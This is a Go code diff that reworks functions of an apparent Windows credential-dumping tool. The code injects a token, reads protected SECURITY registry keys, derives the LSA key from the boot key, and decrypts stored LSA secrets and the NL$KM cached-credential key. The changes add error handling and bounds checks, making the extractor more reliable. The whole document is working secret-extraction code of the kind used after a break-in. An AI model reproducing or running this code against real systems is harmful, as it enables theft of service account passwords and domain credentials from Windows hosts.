@@ -528,7 +528,6 @@ func GetLSASecretkey(token windows.Token, bootkey []byte) (result []byte, err er
 	// Inject the token
 	err = utils.InjectToken(token)
 	if err != nil {
-		fmt.Println("failed to inject token: %v", err)
 		return nil, fmt.Errorf("failed to inject token: %w", err)
 	}
 
@@ -536,55 +535,77 @@ func GetLSASecretkey(token windows.Token, bootkey []byte) (result []byte, err er
 	var data []byte
 
 	// Open the registry key to check for Vista-style encryption keys
-	regKey, err := registry.OpenKey(registry.LOCAL_MACHINE, `SECURITY\Policy\PolEKList`, registry.READ)
+	regKey, err := registry.OpenKey(registry.LOCAL_MACHINE, `SECURITY\Policy\PolEKList`, registry.READ|registry.QUERY_VALUE)
 	if err != nil {
 		if err == registry.ErrNotExist {
 			VistaStyle = false
 		} else {
-			fmt.Println("error opening key `SECURITY\\Policy\\PolEKList`: %v", err)
 			return nil, fmt.Errorf("error opening key `SECURITY\\Policy\\PolEKList`: %w", err)
 		}
 	} else {
-		// Query the value if the key was successfully opened
-		data, _, err = regKey.GetBinaryValue("")
-		regKey.Close()
+		defer regKey.Close()
 
+		// Get the size and type of the value
+		dataLen, valType, err := regKey.GetValue("", nil)
 		if err != nil {
-			fmt.Println("error querying binary value on key `SECURITY\\Policy\\PolEKList`: %v", err)
-			return nil, fmt.Errorf("error querying binary value on key `SECURITY\\Policy\\PolEKList`: %w", err)
+			return nil, fmt.Errorf("error getting value info: %w", err)
+		}
+
+		// Allocate buffer of the correct size
+		data = make([]byte, dataLen)
+		
+		// Read the value
+		dataLen, valType, err = regKey.GetValue("", data)
+		if err != nil {
+			return nil, fmt.Errorf("error reading registry value: %w", err)
+		}
+
+		// Verify the value type
+		if valType != registry.BINARY && valType != registry.NONE {
+			return nil, fmt.Errorf("unexpected registry value type: %d", valType)
 		}
 	}
 
 	// If Vista-style encryption keys are not found, check for pre-Vista encryption keys
 	if !VistaStyle {
-		regKey, err = registry.OpenKey(registry.LOCAL_MACHINE, `SECURITY\Policy\PolSecretEncryptionKey`, registry.READ)
+		regKey, err = registry.OpenKey(registry.LOCAL_MACHINE, `SECURITY\Policy\PolSecretEncryptionKey`, registry.READ|registry.QUERY_VALUE)
 		if err != nil {
 			if err == registry.ErrNotExist {
-				fmt.Println("Could not find LSA Secret key")
-				return nil, nil
+				return nil, fmt.Errorf("could not find LSA Secret key")
 			}
-			fmt.Println("error opening key `SECURITY\\Policy\\PolSecretEncryptionKey`: %v", err)
 			return nil, fmt.Errorf("error opening key `SECURITY\\Policy\\PolSecretEncryptionKey`: %w", err)
 		}
-		data, _, err = regKey.GetBinaryValue("")
-		regKey.Close()
+		defer regKey.Close()
+
+		// Get the size and type of the value
+		dataLen, valType, err := regKey.GetValue("", nil)
 		if err != nil {
-			fmt.Println("error querying value on key `SECURITY\\Policy\\PolSecretEncryptionKey`: %v", err)
-			return nil, fmt.Errorf("error querying value on key `SECURITY\\Policy\\PolSecretEncryptionKey`: %w", err)
+			return nil, fmt.Errorf("error getting value info: %w", err)
+		}
+
+		// Allocate buffer of the correct size
+		data = make([]byte, dataLen)
+		
+		// Read the value
+		dataLen, valType, err = regKey.GetValue("", data)
+		if err != nil {
+			return nil, fmt.Errorf("error reading registry value: %w", err)
+		}
+
+		// Verify the value type
+		if valType != registry.BINARY && valType != registry.NONE {
+			return nil, fmt.Errorf("unexpected registry value type: %d", valType)
 		}
 	}
 
 	// Check if data is empty
 	if len(data) == 0 {
-		err = fmt.Errorf("failed to get LSA key")
-		fmt.Println(err)
-		return nil, err
+		return nil, fmt.Errorf("failed to get LSA key: empty data")
 	}
 
 	// Decrypt the LSA key
 	result, err = decryptLSAKey(bootkey, data, VistaStyle)
 	if err != nil {
-		fmt.Println("error decrypting LSA key: %v", err)
 		return nil, fmt.Errorf("error decrypting LSA key: %w", err)
 	}
 
@@ -595,152 +616,275 @@ func GetLSASecretkey(token windows.Token, bootkey []byte) (result []byte, err er
 }
 
 
-
 func decryptLSAKey(bootkey, data []byte, VistaStyle bool) (result []byte, err error) {
+	if len(bootkey) == 0 {
+		return nil, fmt.Errorf("bootkey is empty")
+	}
+	if len(data) == 0 {
+		return nil, fmt.Errorf("data is empty")
+	}
+
 	var plaintext []byte
 	if VistaStyle {
 		lsaSecret := &lsa_secret{}
-		lsaSecret.unmarshal(data)
-		encryptedData := lsaSecret.EncryptedData
-		tmpkey := SHA256(bootkey, encryptedData[:32], 0)
-		plaintext, err2 := DecryptAES(tmpkey, encryptedData[32:], nil)
-		if err2 != nil {
-			fmt.Printf("error decrypting LSAKey: %s\n", err2)
-			err = err2
-			return
+		if err := lsaSecret.unmarshal(data); err != nil {
+			return nil, fmt.Errorf("failed to unmarshal LSA secret: %w", err)
 		}
+
+		encryptedData := lsaSecret.EncryptedData
+		if len(encryptedData) < 32 {
+			return nil, fmt.Errorf("encrypted data too short: %d bytes", len(encryptedData))
+		}
+
+		tmpkey := SHA256(bootkey, encryptedData[:32], 0)
+		plaintext, err = DecryptAES(tmpkey, encryptedData[32:], nil)
+		if err != nil {
+			return nil, fmt.Errorf("error decrypting LSAKey: %w", err)
+		}
+
 		lsaSecretBlob := &lsa_secret_blob{}
-		lsaSecretBlob.unmarshal(plaintext)
-		result = lsaSecretBlob.Secret[52:][:32]
-	}else {
+		if err := lsaSecretBlob.unmarshal(plaintext); err != nil {
+			return nil, fmt.Errorf("failed to unmarshal LSA secret blob: %w", err)
+		}
+
+		// Fix the slice bounds issue
+		if len(lsaSecretBlob.Secret) < 84 { // 52 + 32
+			return nil, fmt.Errorf("secret blob too short: %d bytes", len(lsaSecretBlob.Secret))
+		}
+		
+		result = make([]byte, 32)
+		copy(result, lsaSecretBlob.Secret[52:84]) // Use explicit end bound instead of slice
+	} else {
+		if len(data) < 76 { // Check minimum length for pre-Vista (12 + 48 + 16)
+			return nil, fmt.Errorf("pre-Vista data too short: %d bytes", len(data))
+		}
+
 		h := md5.New()
 		h.Write(bootkey)
-		for i :=0; i < 1000; i++ {
+		for i := 0; i < 1000; i++ {
 			h.Write(data[60:76])
 		}
 		tmpkey := h.Sum(nil)
-		c1, err2 := rc4.NewCipher(tmpkey[:])
-		if err2 != nil {
-			err = err2
-			fmt.Printf("failed to get RC4 in 'decryptLSAKey function error: %s\n", err)
-			return
+		
+		c1, err := rc4.NewCipher(tmpkey[:])
+		if err != nil {
+			return nil, fmt.Errorf("failed to initialize RC4: %w", err)
 		}
+
 		plaintext = make([]byte, 48)
 		c1.XORKeyStream(plaintext, data[12:60])
-		result = plaintext[0x10:0x20]
+
+		if len(plaintext) < 32 { // 0x20
+			return nil, fmt.Errorf("decrypted data too short: %d bytes", len(plaintext))
+		}
+
+		result = make([]byte, 16) // 0x20 - 0x10
+		copy(result, plaintext[16:32]) // 0x10:0x20
 	}
-	return
-    
+
+	return result, nil
 }
 func GetLSASecrets(token windows.Token, bootKey []byte, VistaStyle, history bool) (secrets []PrintableLSASecret, err error) {
-	err = utils.InjectToken(token) // inject token
+    // Inject token
+    err = utils.InjectToken(token)
     if err != nil {
         return nil, fmt.Errorf("failed to inject token: %w", err)
     }
-	secretPath := `SECURITY\Policy\Secrets`
-	var keys []string
-	regkey, _ := registry.OpenKey(registry.LOCAL_MACHINE, secretPath, registry.READ)
-	keys, _ = regkey.ReadSubKeyNames(-1)
-	regkey.Close()
-	LSAKey, err = GetLSASecretkey(token, bootKey)
-	if err != nil {
-		fmt.Printf("unable to get LSASecret key: %s\n", err)
-		return nil, err
-	}
-	if len(keys) == 0{
-		return
-	}
-	for _, key := range keys {
-		if key == "NL$Control" {
-			continue
-		}
-		valueTypeList := []string{"CurrVal"}
-		if history {
-			valueTypeList = append(valueTypeList, "OldVal")
-		}
-		var secret []byte
-		for _, valueType := range valueTypeList {
-			k := fmt.Sprintf("%s\\%s\\%s", secretPath, key, valueType)
-			regkey, err = registry.OpenKey(registry.LOCAL_MACHINE,k ,registry.READ)
-			if err != nil {
-				fmt.Printf("error opening key '%s' error: %s\n",k, err)
-				return nil,err
-			}
-			value, _,err := regkey.GetBinaryValue("")
-			if err != nil {
-				fmt.Printf("Error getting key '%s' error: %s\n", k, err)
-				regkey.Close()
-				continue
-			}
-			regkey.Close()
-			if (len(value) != 0) && (value[0] == 0x0) {
-				if VistaStyle{
-					record := &lsa_secret{}
-					record.unmarshal(value)
-					tmpKey := SHA256(LSAKey, record.EncryptedData[:32], 0)
-					plaintext, err := DecryptAES(tmpKey, record.EncryptedData[32:], nil)
-					if err != nil {
-						fmt.Printf("error decrypting tmpkey on line 505: %s\n",err)
-						continue
-					}
-					record2 := &lsa_secret_blob{}
-					record2.unmarshal(plaintext)
-					secret = record2.Secret
-				} else {
-					continue
-				}
-				if valueType == "OldVal" {
-					key += "_history"
-				}
-				ps, err := parseSecret(token, key, secret)
-				if err != nil {
-					fmt.Printf("Error parsing secret '%s' error: %s\n", secret,err)
-				}else if ps == nil {
-					continue
-				}
-				secrets = append(secrets, *ps)
-			}
-		}
 
-	}
-	return
+    secretPath := `SECURITY\Policy\Secrets`
+    var keys []string
+    
+    // Open the main secrets key
+    regkey, err := registry.OpenKey(registry.LOCAL_MACHINE, secretPath, registry.READ)
+    if err != nil {
+        return nil, fmt.Errorf("error opening secrets key: %w", err)
+    }
+    keys, err = regkey.ReadSubKeyNames(-1)
+    regkey.Close()
+    if err != nil {
+        return nil, fmt.Errorf("error reading subkey names: %w", err)
+    }
 
-	
+    // Get LSA Secret key
+    LSAKey, err = GetLSASecretkey(token, bootKey)
+    if err != nil {
+        return nil, fmt.Errorf("unable to get LSASecret key: %w", err)
+    }
+
+    if len(keys) == 0 {
+        return
+    }
+
+    for _, key := range keys {
+        if key == "NL$Control" {
+            continue
+        }
+
+        valueTypeList := []string{"CurrVal"}
+        if history {
+            valueTypeList = append(valueTypeList, "OldVal")
+        }
+
+        var secret []byte
+        for _, valueType := range valueTypeList {
+            k := fmt.Sprintf("%s\\%s\\%s", secretPath, key, valueType)
+            
+            // Open the specific secret key with proper permissions
+            regkey, err = registry.OpenKey(registry.LOCAL_MACHINE, k, registry.READ|registry.QUERY_VALUE)
+            if err != nil {
+                fmt.Printf("error opening key '%s' error: %s\n", k, err)
+                continue
+            }
+
+            // Get the size and type of the value first
+            dataLen, valType, err := regkey.GetValue("", nil)
+            if err != nil {
+                fmt.Printf("Error getting value info for '%s' error: %s\n", k, err)
+                regkey.Close()
+                continue
+            }
+
+            if dataLen == 0 {
+                regkey.Close()
+                continue
+            }
+
+            // Allocate buffer and read the value
+            value := make([]byte, dataLen)
+            dataLen, valType, err = regkey.GetValue("", value)
+            if err != nil {
+                fmt.Printf("Error reading value for '%s' error: %s\n", k, err)
+                regkey.Close()
+                continue
+            }
+            regkey.Close()
+
+            // Verify value type
+            if valType != registry.BINARY && valType != registry.NONE {
+                fmt.Printf("Unexpected value type %d for key '%s'\n", valType, k)
+                continue
+            }
+
+            if len(value) != 0 && value[0] == 0x0 {
+                if VistaStyle {
+                    record := &lsa_secret{}
+                    if err := record.unmarshal(value); err != nil {
+                        fmt.Printf("Error unmarshaling LSA secret for '%s': %s\n", k, err)
+                        continue
+                    }
+
+                    if len(record.EncryptedData) < 32 {
+                        fmt.Printf("Encrypted data too short for '%s'\n", k)
+                        continue
+                    }
+
+                    tmpKey := SHA256(LSAKey, record.EncryptedData[:32], 0)
+                    plaintext, err := DecryptAES(tmpKey, record.EncryptedData[32:], nil)
+                    if err != nil {
+                        fmt.Printf("error decrypting tmpkey for '%s': %s\n", k, err)
+                        continue
+                    }
+
+                    record2 := &lsa_secret_blob{}
+                    if err := record2.unmarshal(plaintext); err != nil {
+                        fmt.Printf("Error unmarshaling LSA secret blob for '%s': %s\n", k, err)
+                        continue
+                    }
+                    secret = record2.Secret
+                } else {
+                    continue
+                }
+
+                if valueType == "OldVal" {
+                    key += "_history"
+                }
+
+                ps, err := parseSecret(token, key, secret)
+                if err != nil {
+                    fmt.Printf("Error parsing secret for '%s': %s\n", key, err)
+                } else if ps == nil {
+                    continue
+                }
+                secrets = append(secrets, *ps)
+            }
+        }
+    }
+    return
 }
+
+
 func getNLKMSecretKey(token windows.Token, bootkey []byte, VistaStyle bool) (result []byte, err error) {
-    err = utils.InjectToken(token) // inject token
+    // Inject token
+    err = utils.InjectToken(token)
     if err != nil {
         return nil, fmt.Errorf("failed to inject token: %w", err)
     }
-	regkey, err := registry.OpenKey(registry.LOCAL_MACHINE,`SECURITY\Policy\Secrets\NL$KM\CurrVal`, registry.READ)
+
+    // Open the registry key with proper permissions
+    regkey, err := registry.OpenKey(registry.LOCAL_MACHINE, 
+        `SECURITY\Policy\Secrets\NL$KM\CurrVal`, 
+        registry.READ|registry.QUERY_VALUE)
     if err != nil {
-		fmt.Printf("error opening key for NLKMSecretKey: '%s'\n",err)
-		return
-	}
-	data, _,err := regkey.GetBinaryValue("")
-	if err != nil {
-		fmt.Printf("error opening value for NLKMSecretKey: '%s'\n",err)
-		return
-	}
-	defer regkey.Close()
-	if VistaStyle {
-		lsaSecret := &lsa_secret{}
-		lsaSecret.unmarshal(data)
-		tmpkey := SHA256(LSAKey, lsaSecret.EncryptedData[:32], 0)
-		var err2 error
-		result, err2 = DecryptAES(tmpkey, lsaSecret.EncryptedData[32:], nil)
-		if err2 != nil {
-			fmt.Printf("error decrypting AESKey: '%s' error: %s\n", lsaSecret.EncryptedData[32:], err2)
-			err = err2
-			return
-		}
-	}else {
-		fmt.Println("Not yet implement how to decrypt NL$KM key when not VistaStyle")
-		return
-	}
-	NLKMKey = make([]byte, 32)
-	copy(NLKMKey, result)
-	return
+        return nil, fmt.Errorf("error opening key for NLKMSecretKey: %w", err)
+    }
+    defer regkey.Close()
+
+    // Get the size and type of the value first
+    dataLen, valType, err := regkey.GetValue("", nil)
+    if err != nil {
+        return nil, fmt.Errorf("error getting value info for NLKMSecretKey: %w", err)
+    }
+
+    if dataLen == 0 {
+        return nil, fmt.Errorf("empty registry value for NLKMSecretKey")
+    }
+
+    // Allocate buffer of the correct size
+    data := make([]byte, dataLen)
+    
+    // Read the actual value
+    dataLen, valType, err = regkey.GetValue("", data)
+    if err != nil {
+        return nil, fmt.Errorf("error reading value for NLKMSecretKey: %w", err)
+    }
+
+    // Verify the value type
+    if valType != registry.BINARY && valType != registry.NONE {
+        return nil, fmt.Errorf("unexpected registry value type: %d", valType)
+    }
+
+    if VistaStyle {
+        if LSAKey == nil || len(LSAKey) == 0 {
+            return nil, fmt.Errorf("LSAKey is not initialized")
+        }
+
+        lsaSecret := &lsa_secret{}
+        if err := lsaSecret.unmarshal(data); err != nil {
+            return nil, fmt.Errorf("failed to unmarshal LSA secret: %w", err)
+        }
+
+        if len(lsaSecret.EncryptedData) < 32 {
+            return nil, fmt.Errorf("encrypted data too short: %d bytes", len(lsaSecret.EncryptedData))
+        }
+
+        tmpkey := SHA256(LSAKey, lsaSecret.EncryptedData[:32], 0)
+        result, err = DecryptAES(tmpkey, lsaSecret.EncryptedData[32:], nil)
+        if err != nil {
+            return nil, fmt.Errorf("error decrypting AESKey: %w", err)
+        }
+
+        if len(result) < 32 {
+            return nil, fmt.Errorf("decrypted result too short: %d bytes", len(result))
+        }
+    } else {
+        return nil, fmt.Errorf("pre-Vista style decryption not yet implemented for NL$KM key")
+    }
+
+    // Copy the result to the global NLKMKey variable
+    NLKMKey = make([]byte, 32)
+    copy(NLKMKey, result[:32])
+    
+    return result[:32], nil
 }
 
 
